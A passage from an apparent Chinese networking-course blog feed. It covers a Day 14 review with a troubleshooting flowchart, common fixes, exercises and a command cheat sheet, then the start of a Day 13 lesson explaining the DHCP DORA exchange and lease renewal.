网卡指示灯是否亮？<br>│<br>├─ 步骤<span class="hljs-number">2</span>: 检查IP配置<br>│   ├─ IP地址: <span class="hljs-built_in">ipconfig</span> / ip addr<br>│   ├─ 子网掩码正确？<br>│   ├─ 网关配置正确？<br>│   └─ DNS服务器配置正确？<br>│<br>├─ 步骤<span class="hljs-number">3</span>: <span class="hljs-built_in">Ping</span>测试<br>│   ├─ <span class="hljs-built_in">ping</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> (本机)<br>│   ├─ <span class="hljs-built_in">ping</span> 网关<br>│   ├─ <span class="hljs-built_in">ping</span> DNS服务器<br>│   └─ <span class="hljs-built_in">ping</span> 外网IP (<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>)<br>│<br>├─ 步骤<span class="hljs-number">4</span>: DNS测试<br>│   ├─ nslookup www.baidu.com<br>│   └─ 检查DNS解析是否正常<br>│<br>└─ 步骤<span class="hljs-number">5</span>: 路由测试<br>    └─ traceroute/tracert 检查路径<br></code></pre></td></tr></table></figure><h3 id="4-2-常见问题和解决方案">4.2 常见问题和解决方案</h3><p><strong>问题1：获取不到IP地址（169.254.x.x）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">原因：<br>- DHCP服务器故障<br>- 网络线路问题<br>- DHCP服务未启动<br><br>解决方法：<br>1. 重启网卡<br>   <span class="hljs-comment"># Windows</span><br>   ipconfig /release<br>   ipconfig /renew<br><br>   <span class="hljs-comment"># Linux</span><br>   <span class="hljs-built_in">sudo</span> dhclient -r<br>   <span class="hljs-built_in">sudo</span> dhclient<br><br>2. 检查DHCP服务器<br>3. 手动配置静态IP<br></code></pre></td></tr></table></figure><p><strong>问题2：能Ping通IP但无法访问网站</strong></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">原因：</span><br><span class="hljs-attribute">- DNS服务器故障</span><br><span class="hljs-attribute">- DNS配置错误</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">解决方法：</span><br><span class="hljs-attribute">1. 更换DNS服务器</span><br><span class="hljs-attribute">   Windows</span><span class="hljs-punctuation">:</span> <span class="hljs-string">网络适配器设置</span><br>   <span class="hljs-attribute">Linux</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/etc/resolv.conf</span><br><br>   <span class="hljs-attribute">推荐DNS</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8 (Google)</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114 (114DNS)</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">1.1.1.1 (Cloudflare)</span><br><br>2. 清除DNS缓存<br>   <span class="hljs-comment"># Windows</span><br>   ipconfig /flushdns<br><br>   <span class="hljs-comment"># Linux</span><br>   sudo systemd-resolve --flush-caches<br></code></pre></td></tr></table></figure><p><strong>问题3：网速很慢</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">原因：<br><span class="hljs-bullet">-</span> 网络拥堵<br><span class="hljs-bullet">-</span> 带宽限制<br><span class="hljs-bullet">-</span> DNS解析慢<br><span class="hljs-bullet">-</span> 路由问题<br><br>诊断方法：<br><span class="hljs-bullet">1.</span> 测试带宽<br>   使用speedtest等工具<br><br><span class="hljs-bullet">2.</span> 检查延迟<br>   ping -n 100 网关<br>   检查平均延迟和抖动<br><br><span class="hljs-bullet">3.</span> 追踪路由<br>   tracert www.baidu.com<br>   查看哪一跳延迟高<br><br><span class="hljs-bullet">4.</span> 优化DNS<br>   更换更快的DNS服务器<br></code></pre></td></tr></table></figure><hr><h2 id="5-第一阶段技能清单">5. 第一阶段技能清单</h2><p>完成第一阶段后，你应该掌握：</p><h3 id="5-1-理论知识">5.1 理论知识</h3><ul><li>✅ 理解OSI七层模型和TCP/IP四层模型</li><li>✅ 掌握IP地址分类和子网划分</li><li>✅ 理解MAC地址和ARP协议</li><li>✅ 掌握DNS和DHCP工作原理</li><li>✅ 理解端口和Socket概念</li></ul><h3 id="5-2-工具使用">5.2 工具使用</h3><ul><li>✅ ping - 测试连通性</li><li>✅ traceroute/tracert - 追踪路由</li><li>✅ ipconfig/ifconfig - 查看网络配置</li><li>✅ nslookup/dig - DNS查询</li><li>✅ arp - 查看ARP缓存</li><li>✅ Wireshark - 抓包分析</li></ul><h3 id="5-3-编程能力">5.3 编程能力</h3><ul><li>✅ 使用Python socket库</li><li>✅ 实现网络连接检测</li><li>✅ 实现局域网扫描</li><li>✅ 实现简单的ping和traceroute</li><li>✅ 实现DNS查询工具</li></ul><h3 id="5-4-问题排查">5.4 问题排查</h3><ul><li>✅ 系统化的网络问题诊断流程</li><li>✅ 使用命令行工具排查问题</li><li>✅ 分析网络配置错误</li><li>✅ 解决常见网络问题</li></ul><hr><h2 id="6-今日练习">6. 今日练习</h2><h3 id="练习1：综合诊断">练习1：综合诊断</h3><p>运行day14的网络检测工具，分析输出结果，回答：</p><ol><li>你的本机IP地址是什么？属于哪一类？</li><li>默认网关是什么？</li><li>DNS解析速度如何？</li><li>是否存在网络问题？</li></ol><h3 id="练习2：子网划分">练习2：子网划分</h3><p>给定网络 192.168.10.0/24，划分为：</p><ol><li>4个相等的子网</li><li>计算每个子网的网络地址、广播地址、可用IP范围</li><li>选择CIDR表示法</li></ol><h3 id="练习3：故障排查">练习3：故障排查</h3><p>假设场景：</p><ul><li>能ping通192.168.1.1（网关）</li><li>能ping通8.8.8.8</li><li><a href="http://xn--www-7z8f502aym2co5o.baidu.com">无法访问www.baidu.com</a></li></ul><p>请使用所学的诊断方法，找出问题原因并给出解决方案。</p><h3 id="练习4：抓包分析">练习4：抓包分析</h3><p>使用Wireshark：</p><ol><li>抓取一次完整的DHCP四次握手</li><li>分析每个数据包的内容</li><li>识别DORA四个阶段</li><li>截图标注关键信息</li></ol><hr><h2 id="7-扩展学习">7. 扩展学习</h2><h3 id="7-1-推荐阅读">7.1 推荐阅读</h3><ul><li>RFC 791: Internet Protocol (IP)</li><li>RFC 826: Address Resolution Protocol (ARP)</li><li>RFC 792: Internet Control Message Protocol (ICMP)</li><li>RFC 2131: Dynamic Host Configuration Protocol (DHCP)</li><li>RFC 1035: Domain Names - Implementation and Specification (DNS)</li></ul><h3 id="7-2-在线资源">7.2 在线资源</h3><ul><li>Wireshark官方教程</li><li>子网划分在线计算器</li><li>网络协议分析案例</li></ul><h3 id="7-3-实践建议">7.3 实践建议</h3><ol><li>搭建虚拟实验环境（VirtualBox + 多台虚拟机）</li><li>配置不同的网络拓扑</li><li>模拟各种网络故障</li><li>练习问题诊断和解决</li></ol><hr><h2 id="8-下一阶段预告">8. 下一阶段预告</h2><h3 id="第二阶段：应用层协议深入（Day-15-27）">第二阶段：应用层协议深入（Day 15-27）</h3><p><strong>第3周：传输层协议基础</strong></p><ul><li>TCP协议详解</li><li>TCP可靠传输机制</li><li>UDP协议</li><li>Socket编程</li></ul><p><strong>第4周：网络层协议深入</strong></p><ul><li>IP协议深入</li><li>IPv6</li><li>ICMP详解</li><li>路由协议基础</li></ul><p>学习重点：</p><ul><li>深入理解TCP/IP核心协议</li><li>掌握Socket网络编程</li><li>学习网络层路由机制</li><li>完成更复杂的实战项目</li></ul><hr><h2 id="9-总结">9. 总结</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm">第一阶段学习路径：<br><br>网络基础概念 → 协议分层模型 → 诊断工具<br>       ↓              ↓            ↓<br>   网络拓扑        OSI/TCP-<span class="hljs-built_in">IP</span>     ping/traceroute<br>                      ↓<br>              <span class="hljs-built_in">IP</span>地址和子网划分<br>                      ↓<br>              MAC地址和ARP<br>                      ↓<br>              DNS和DHCP<br>                      ↓<br>           综合实战：网络诊断工具<br><br>核心能力：<br>✅ 网络基础理论<br>✅ 协议工作原理<br>✅ 工具使用<br>✅ 编程实现<br>✅ 问题诊断<br><br>学习心得：<br>网络基础是所有网络技术的根基。<br>理解了<span class="hljs-built_in">IP</span>地址、子网划分、ARP、DNS这些基础概念，<br>就像掌握了网络世界的<span class="hljs-string">&quot;字母表&quot;</span>。<br><br>接下来我们将深入传输层和网络层，<br>学习TCP/<span class="hljs-built_in">IP</span>协议栈的核心机制。<br><br>继续加油！💪<br></code></pre></td></tr></table></figure><hr><p><strong>进度：14/120天（11.7%）</strong></p><p>恭喜完成第一阶段学习！你已经建立了扎实的网络基础知识。接下来的学习将更加深入和精彩，让我们继续前进！</p><hr><h2 id="附录：常用命令速查表">附录：常用命令速查表</h2><h3 id="Windows命令">Windows命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all              <span class="hljs-comment"># 查看详细网络配置</span><br>ipconfig /release          <span class="hljs-comment"># 释放DHCP分配的IP</span><br>ipconfig /renew            <span class="hljs-comment"># 重新获取IP</span><br>ipconfig /flushdns         <span class="hljs-comment"># 清除DNS缓存</span><br>ipconfig /displaydns       <span class="hljs-comment"># 显示DNS缓存</span><br><br>ping &lt;IP&gt;                  <span class="hljs-comment"># 测试连通性</span><br>ping -t &lt;IP&gt;              <span class="hljs-comment"># 持续ping</span><br>tracert &lt;域名&gt;             <span class="hljs-comment"># 追踪路由</span><br>nslookup &lt;域名&gt;            <span class="hljs-comment"># DNS查询</span><br>arp -a                     <span class="hljs-comment"># 查看ARP缓存</span><br>netstat -an               <span class="hljs-comment"># 查看网络连接</span><br>route <span class="hljs-built_in">print</span>               <span class="hljs-comment"># 查看路由表</span><br></code></pre></td></tr></table></figure><h3 id="Linux-Mac命令">Linux/Mac命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr show              <span class="hljs-comment"># 查看网络配置</span><br>ip route show             <span class="hljs-comment"># 查看路由表</span><br>ifconfig                  <span class="hljs-comment"># 查看网络接口（旧）</span><br><br>ping &lt;IP&gt;                 <span class="hljs-comment"># 测试连通性</span><br>ping -c 4 &lt;IP&gt;           <span class="hljs-comment"># ping 4次</span><br>traceroute &lt;域名&gt;         <span class="hljs-comment"># 追踪路由</span><br>dig &lt;域名&gt;                <span class="hljs-comment"># DNS查询（详细）</span><br>nslookup &lt;域名&gt;           <span class="hljs-comment"># DNS查询（简单）</span><br><br>arp -a                    <span class="hljs-comment"># 查看ARP缓存</span><br>netstat -an              <span class="hljs-comment"># 查看网络连接</span><br>ss -tulpn                <span class="hljs-comment"># 查看监听端口</span><br><br><span class="hljs-built_in">sudo</span> dhclient -r         <span class="hljs-comment"># 释放IP</span><br><span class="hljs-built_in">sudo</span> dhclient            <span class="hljs-comment"># 获取IP</span><br><span class="hljs-built_in">sudo</span> systemd-resolve --flush-caches  <span class="hljs-comment"># 清除DNS缓存</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13天：DHCP协议详解</title>
    <link href="/2025/11/10/13%E5%A4%A9%EF%BC%9ADHCP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/13%E5%A4%A9%EF%BC%9ADHCP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>第13天：DHCP协议详解</h1><h2 id="今日目标">今日目标</h2><ul><li>理解DHCP的工作原理和作用</li><li>掌握DHCP四次握手过程</li><li>了解IP地址租约管理机制</li><li>学会分析DHCP数据包</li><li>实现DHCP服务器模拟器</li></ul><hr><h2 id="1-什么是DHCP？">1. 什么是DHCP？</h2><h3 id="1-1-DHCP的定义">1.1 DHCP的定义</h3><p><strong>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）</strong> 是一种网络管理协议，用于自动分配IP地址和网络配置。</p><p><strong>生活类比</strong>：</p><ul><li>你去酒店入住，不需要自己决定住哪个房间</li><li>前台会自动分配一个空房间给你</li><li>退房后，房间可以分配给其他客人</li><li>DHCP就是网络中的&quot;前台&quot;，自动分配IP地址</li></ul><h3 id="1-2-为什么需要DHCP？">1.2 为什么需要DHCP？</h3><p><strong>没有DHCP的痛苦</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm">场景<span class="hljs-number">1</span>：公司有<span class="hljs-number">100</span>台电脑<br>❌ 手动配置每台电脑的<span class="hljs-built_in">IP</span>地址<br>❌ 记录哪些<span class="hljs-built_in">IP</span>已被使用<br>❌ 避免<span class="hljs-built_in">IP</span>地址冲突<br>❌ 新员工入职需要IT手动配置<br>❌ 员工离职需要手动回收<span class="hljs-built_in">IP</span><br><br>时间成本：每台约<span class="hljs-number">10</span>分钟 × <span class="hljs-number">100</span>台 = <span class="hljs-number">1000</span>分钟<br></code></pre></td></tr></table></figure><p><strong>使用DHCP的好处</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm">场景<span class="hljs-number">2</span>：配置DHCP服务器<br>✅ 电脑开机自动获取<span class="hljs-built_in">IP</span><br>✅ 无需人工干预<br>✅ 自动避免<span class="hljs-built_in">IP</span>冲突<br>✅ 新设备即插即用<br>✅ 离线设备自动回收<span class="hljs-built_in">IP</span><br><br>时间成本：配置一次DHCP服务器 ≈ <span class="hljs-number">30</span>分钟<br></code></pre></td></tr></table></figure><h3 id="1-3-DHCP能配置什么？">1.3 DHCP能配置什么？</h3><p>DHCP不仅分配IP地址，还会配置：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> IP地址           192.168.1.100<br><span class="hljs-bullet">2.</span> 子网掩码         255.255.255.0<br><span class="hljs-bullet">3.</span> 默认网关         192.168.1.1<br><span class="hljs-bullet">4.</span> DNS服务器        8.8.8.8, 114.114.114.114<br><span class="hljs-bullet">5.</span> 租约时间         24小时<br><span class="hljs-bullet">6.</span> WINS服务器       （可选）<br><span class="hljs-bullet">7.</span> 域名             example.com<br><span class="hljs-bullet">8.</span> NTP时间服务器    （可选）<br></code></pre></td></tr></table></figure><hr><h2 id="2-DHCP工作原理">2. DHCP工作原理</h2><h3 id="2-1-DHCP四次握手（DORA过程）">2.1 DHCP四次握手（DORA过程）</h3><p>DHCP获取IP地址需要四个步骤，称为<strong>DORA过程</strong>：</p><ol><li><strong>D</strong>iscover - 发现服务器</li><li><strong>O</strong>ffer - 提供地址</li><li><strong>R</strong>equest - 请求地址</li><li><strong>A</strong>ck - 确认分配</li></ol><p><strong>完整流程图</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">客户端                                    DHCP服务器<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  1. DHCP Discover (广播)                 </span>|<br>  |<span class="hljs-string">  &quot;有DHCP服务器吗？我需要IP地址&quot;           </span>|<br>  |<span class="hljs-string">------------------------------------------&gt;</span>|<br>  |<span class="hljs-string">     源IP: 0.0.0.0                         </span>|<br>  |<span class="hljs-string">     目标IP: 255.255.255.255               </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">                                           </span>|<span class="hljs-string"> 检查可用IP</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<span class="hljs-string"> 找到: 192.168.1.100</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  2. DHCP Offer (单播/广播)                </span>|<br>  |<span class="hljs-string">  &quot;我这里有个IP：192.168.1.100&quot;            </span>|<br>  |<span class="hljs-string">&lt;------------------------------------------</span>|<br>  |<span class="hljs-string">     源IP: 192.168.1.1                     </span>|<br>  |<span class="hljs-string">     提供IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string"> 决定接受这个IP                             </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  3. DHCP Request (广播)                   </span>|<br>  |<span class="hljs-string">  &quot;我要192.168.1.100这个IP&quot;                </span>|<br>  |<span class="hljs-string">------------------------------------------&gt;</span>|<br>  |<span class="hljs-string">     请求IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">                                           </span>|<span class="hljs-string"> 确认IP可用</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<span class="hljs-string"> 标记为已分配</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string">  4. DHCP Ack (单播)                       </span>|<br>  |<span class="hljs-string">  &quot;好的，192.168.1.100归你了，租期24小时&quot;   </span>|<br>  |<span class="hljs-string">&lt;------------------------------------------</span>|<br>  |<span class="hljs-string">     确认IP: 192.168.1.100                 </span>|<br>  |<span class="hljs-string">     租期: 86400秒                          </span>|<br>  |<span class="hljs-string">                                           </span>|<br>  |<span class="hljs-string"> ✅ 配置IP地址                              </span>|<br>  |<span class="hljs-string"> ✅ 可以上网了                              </span>|<br>  |<span class="hljs-string">                                           </span>|<br></code></pre></td></tr></table></figure><h3 id="2-2-详细步骤解析">2.2 详细步骤解析</h3><p><strong>步骤1：DHCP Discover（发现）</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">客户端刚开机，还没有<span class="hljs-built_in">IP</span>地址<br><br>广播消息：<br>┌────────────────────────────────┐<br>│ 源MAC：  aa:bb:cc:<span class="hljs-built_in">dd</span>:ee:ff    │<br>│ 目标MAC：ff:ff:ff:ff:ff:ff    │ (广播)<br>│ 源<span class="hljs-built_in">IP</span>：   <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>               │ (还没有<span class="hljs-built_in">IP</span>)<br>│ 目标<span class="hljs-built_in">IP</span>： <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span>       │ (广播)<br>│ 消息：   我需要<span class="hljs-built_in">IP</span>地址！         │<br>│ 事务ID： <span class="hljs-number">0x12345678</span>            │ (用于匹配响应)<br>└────────────────────────────────┘<br><br>特点：<br>- 使用广播，因为不知道DHCP服务器在哪<br>- 源<span class="hljs-built_in">IP</span>是<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>，因为还没有<span class="hljs-built_in">IP</span>地址<br>- 包含客户端的MAC地址（用于识别）<br></code></pre></td></tr></table></figure><p><strong>步骤2：DHCP Offer（提供）</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns">服务器收到Discover后，从地址池中选择一个可用IP<br><br>单播/广播响应：<br>┌────────────────────────────────┐<br>│ 源IP：   <span class="hljs-number">192.168.1.1</span> (DHCP服务器) │<br>│ 目标IP： <span class="hljs-number">192.168.1.100</span> 或 广播   │<br>│ 提供IP： <span class="hljs-number">192.168.1.100</span>          │<br>│ 子网掩码：<span class="hljs-number">255.255.255.0</span>         │<br>│ 默认网关：<span class="hljs-number">192.168.1.1</span>           │<br>│ DNS：    <span class="hljs-number">8.8.8.8</span>                │<br>│ 租期：   <span class="hljs-number">86400</span>秒 (<span class="hljs-number">24</span>小时)       │<br>│ 事务ID： <span class="hljs-number">0x12345678</span> (匹配请求)  │<br>└────────────────────────────────┘<br><br>特点：<br>- 可能有多个DHCP服务器响应<br>- 提供IP但还没有分配<br>- 客户端可以选择接受哪个offer<br></code></pre></td></tr></table></figure><p><strong>步骤3：DHCP Request（请求）</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs armasm">客户端选择一个offer，正式请求该<span class="hljs-built_in">IP</span><br><br>广播消息：<br>┌────────────────────────────────┐<br>│ 源<span class="hljs-built_in">IP</span>：   <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>               │ (仍然没有<span class="hljs-built_in">IP</span>)<br>│ 目标<span class="hljs-built_in">IP</span>： <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>       │ (广播)<br>│ 请求<span class="hljs-built_in">IP</span>： <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span>         │<br>│ 服务器： <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>           │<br>│ 消息：   我要这个<span class="hljs-built_in">IP</span>！           │<br>│ 事务ID： <span class="hljs-number">0x12345678</span>            │<br>└────────────────────────────────┘<br><br>为什么广播？<br>- 告诉所有DHCP服务器：<span class="hljs-string">&quot;我选择了192.168.1.1的offer&quot;</span><br>- 其他服务器可以回收它们提供的<span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><p><strong>步骤4：DHCP Ack（确认）</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">服务器确认分配，客户端可以使用IP了<br><br>单播响应：<br>┌────────────────────────────────┐<br>│ 源IP：   <span class="hljs-number">192.168.1.1</span>           │<br>│ 目标IP： <span class="hljs-number">192.168.1.100</span>         │<br>│ 确认IP： <span class="hljs-number">192.168.1.100</span>         │<br>│ 租期：   <span class="hljs-number">86400</span>秒               │<br>│ 开始时间：<span class="hljs-number">2024-01-15</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>  │<br>│ 更新时间：<span class="hljs-number">2024-01-15</span> <span class="hljs-number">22</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>  │ (<span class="hljs-number">50</span>%租期)<br>│ 重绑时间：<span class="hljs-number">2024-01-16</span> <span class="hljs-number">04</span>:<span class="hljs-number">30</span>:<span class="hljs-number">00</span>  │ (<span class="hljs-number">87</span>.<span class="hljs-number">5</span>%租期)<br>│ 消息：   分配成功！             │<br>└────────────────────────────────┘<br><br>客户端收到Ack后：<br>✅ 配置IP地址：<span class="hljs-number">192.168.1.100</span><br>✅ 配置子网掩码：<span class="hljs-number">255.255.255.0</span><br>✅ 配置默认网关：<span class="hljs-number">192.168.1.1</span><br>✅ 配置DNS服务器：<span class="hljs-number">8.8.8.8</span><br>✅ 启动租约计时器<br></code></pre></td></tr></table></figure><h3 id="2-3-特殊情况">2.3 特殊情况</h3><p><strong>情况1：服务器拒绝（DHCP Nak）</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm">原因：<br>- 请求的<span class="hljs-built_in">IP</span>已被其他设备占用<br>- <span class="hljs-built_in">IP</span>地址不在分配范围内<br>- 租约已过期且<span class="hljs-built_in">IP</span>被重新分配<br><br>流程：<br>客户端 → DHCP Request<br>服务器 → DHCP Nak (拒绝)<br>客户端 → 重新开始，发送 DHCP Discover<br></code></pre></td></tr></table></figure><p><strong>情况2：租约续期</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">时间线（假设租期<span class="hljs-number">24</span>小时）：<br><br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>h        获得IP地址<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">12</span>h (<span class="hljs-number">50</span>%) 尝试续期（直接向原服务器请求）<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">21</span>h (<span class="hljs-number">87.5</span>%) 如果续期失败，广播续期请求<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span 